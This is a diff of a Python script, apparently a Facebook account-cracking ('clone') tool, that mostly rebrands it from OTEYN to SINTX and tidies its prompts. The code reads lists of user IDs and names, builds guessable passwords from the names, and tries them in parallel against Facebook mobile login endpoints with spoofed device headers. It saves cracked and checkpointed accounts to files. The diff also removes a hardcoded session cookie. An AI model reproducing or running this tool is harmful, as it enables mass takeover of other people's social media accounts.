@@ -89,7 +89,7 @@ date_month = str(month_now) + "-" + str(date_now)
 
 
 lxgos = "\n\n                d8,                               \n               `8P              d8P               \n                             d888888P             \n       .d888b,  88b  88bd88b   ?88'  ?88,  88P    \n       ?8b,     88P  88P' ?8b  88P    `?8bd8P'    \n         `?8b  d88  d88   88P  88b    d8P?8b,     \n      `?888P' d88' d88'   88b  `?8b  d8P' `?8b    \n                                            \n                                            \n                                            \n"
-sinInfo = "[white][÷] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] TOOL NAME    : OTEYN\n[-] SCRIPT OWNER : SINTXCS\n[-] FACEBOOK     : EIFF HUCZN\n[-] GITHUB       : OTEYN"
+sinInfo = "[white][›] PRESS [bold yellow]CTRL AND Z[bold white] TO STOP THE PROGRAM\n\n[white][-] FACEBOOK : SINTXCS\n[-] GITHUB   : SINTXCS"
 
 
 def sintx_logo():
@@ -112,7 +112,7 @@ def sintx_menu():
         cmd("xdg-open https://m.me/61553865513324")
         sintx_menu()
     else:
-        print(f"{ro}  [!] INVALID INPUT")
+        アニメ(f"{ro}  [!] INVALID INPUT")
         sintx_menu()
 
 
@@ -129,7 +129,7 @@ ugen = []
 def ク克隆():
     sintx_logo()
     E = "/sdcard/"
-    prnt(pnl("[yellow][Â»] ENTER NAME OF YOUR FILE (ex: EIFF.txt)", width=90, style=_A))
+    prnt(pnl("[yellow][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
     F = input(f"{green}  [+] /sdcard/:{dark_gray} ")
     G = E + F
     try:
@@ -148,12 +148,8 @@ def ク克隆():
             title="SELECT PASSWORD METHOD",
         )
     )
-    H = input(f"{green}  [÷] CHOICE:{dark_gray} ")
+    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
     if H in ["1", "01"]:
-    	A.append("firstgwapa")
-        A.append("firstgwapo")
-        A.append("lastfirst")
-        A.append("last first")
         A.append("first last")
         A.append("first123")
         A.append("first12")
@@ -185,12 +181,12 @@ def ク克隆():
         try:
             prnt(
                 pnl(
-                    "[yellow][÷] HOW MANY PASSWORD DO YOU WANT TO USE?",
+                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                     width=90,
                     style=_A,
                 )
             )
-            C = int(input(f"{green}  [÷] ANSWER:{dark_gray} "))
+            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
         except:
             C = 1
         prnt(
@@ -202,38 +198,38 @@ def ク克隆():
             )
         )
         for I in range(C):
-            A.append(input(f"{green}  [÷] PASSWORD #{I+1}:{dark_gray} "))
+            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
     with ThreadPool(max_workers=None) as J:
         prnt(
             pnl(
-                "[yellow][Â»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
+                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                 width=90,
                 style=_A,
                 title="INSTRUCTIONS",
             )
         )
-        input(f"{green}  [Â»] PRESS ENTER: ")
+        input(f"{green}  [»] PRESS ENTER: ")
         sintx_logo()
         D = str(len(B))
         prnt(
             pnl(
-                "[yellow][Â»] [ON/OFF] AIRPLANE MODE EVERY 90 SECS!",
+                "[yellow][»] NOT FOR SALE!",
                 width=90,
                 style=_A,
-                title="TAKE NOTE!",
+                title="NOTICE!",
             )
         )
-        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: OTEYN FOLDER"
+        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
         prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
         for L in B:
             M, N = L.split("|")
             O = A
             J.submit(sinsAPI_, M, N, O, D)
-    P = "[Â»] HITS : " + str(len(oks))
-    Q = "\n[Â»] CPS  : " + str(len(cps))
+    P = "[»] HITS : " + str(len(oks))
+    Q = "\n[»] CPS  : " + str(len(cps))
     print(_B)
     prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
-    input(f"{dark_gray}  [÷] PRESS ENTER TO REFRESH ")
+    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
     sintx_menu()
 
 
@@ -245,7 +241,7 @@ def sinsAPI_(uid, names, pxss_, tot4l):
     A = uid
     global loop, oks, cps
     sys.stdout.write(
-        f"\r\r{dark_gray}  [OTEYN] %s/%s - OKS: %s - CPS: %s\r "
+        f"\r\r{dark_gray}  [SINTX] %s/%s - OKS: %s - CPS: %s\r "
         % (loop, tot4l, len(oks), len(cps))
     )
     sys.stdout.flush()
@@ -266,30 +262,25 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                 .replace("last", M)
             )
             header = {
-                "authority": "mbasic.facebook.com",
-                "method": "get",
-                "scheme": "https",
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "accept-encoding": "gzip, deflate, br",
-                "accept-language": "en-US,en;q=0.9",
-                "cache-control": "max-age=0",
-                "cookie": "datr=dQmDZc0_ths1lroZrRvDUe84; sb=dQmDZfWn6Xc_QVthOy3O5zGS; vpd=v1%3B822x424x2.549999952316284; wd=424x801; fr=0bA2JLigoFkhzRLyr.AWW8dLd2IOSHnYXVt7nnoww6bJQ.BlgxDQ.xP.AAA.0.0.Blod0N.AWWSL0xCtNY",
-                "dpr": "2.549999952316284",
-                "referer": "https://m.facebook.com/",
-                "sec-ch-prefers-color-scheme": "dark",
-                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
-                "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.240\"",
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-model": "\"RMX3241\"",
-                "sec-ch-ua-platform": "\"Android\"",
-                "sec-ch-ua-platform-version": "\"13.0.0\"",
-                "sec-fetch-dest": "document",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-site": "none",
-                "sec-fetch-user": "?1",
-                "upgrade-insecure-requests": "1",
-                "user-agent": str(PyBookAgents.random_ugen()),
-                "viewport-width": "980"
+               'authority': 'mbasic.facebook.com',
+               "method": "get",
+               "scheme": "https",
+               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+               'accept-language': 'en-US,en;q=0.9',
+               'cache-control': 'max-age=0',
+               'sec-ch-prefers-color-scheme': 'dark',
+               'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+               'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+               'sec-ch-ua-mobile': '?1',
+               'sec-ch-ua-model': '"RMX3241"',
+               'sec-ch-ua-platform': '"Android"',
+               'sec-ch-ua-platform-version': '"13.0.0"',
+               'sec-fetch-dest': 'document',
+               'sec-fetch-mode': 'navigate',
+               'sec-fetch-site': 'none',
+               'sec-fetch-user': '?1',
+               'upgrade-insecure-requests': '1',
+               'user-agent': str(PyBookAgents.random_ugen()),
             }
             I = C.get(
                 f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
@@ -321,7 +312,7 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                 print(_B)
                 T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                 E = pnl(
-                    T, width=90, style="bold pale_turquoise1", title="OTEYN SUCCESSFUL"
+                    T, width=90, style="bold pale_turquoise1", title="SINTX SUCCESSFUL"
                 )
                 prnt(E)
                 oks.append(A)
@@ -330,7 +321,7 @@ def sinsAPI_(uid, names, pxss_, tot4l):
                 cps.append(A)
                 print(_B)
                 U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
-                E = pnl(U, width=90, style="bold red", title="OTEYN CHECKPOINT")
+                E = pnl(U, width=90, style="bold red", title="SINTX CHECKPOINT")
                 prnt(E)
                 open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                     A + "|" + B + "~" + Scrape_Year(uid) + _B
@@ -351,3 +342,4 @@ if __name__ == "__main__":
         sintx_menu()
     except Exception as e:
         exit()
+        
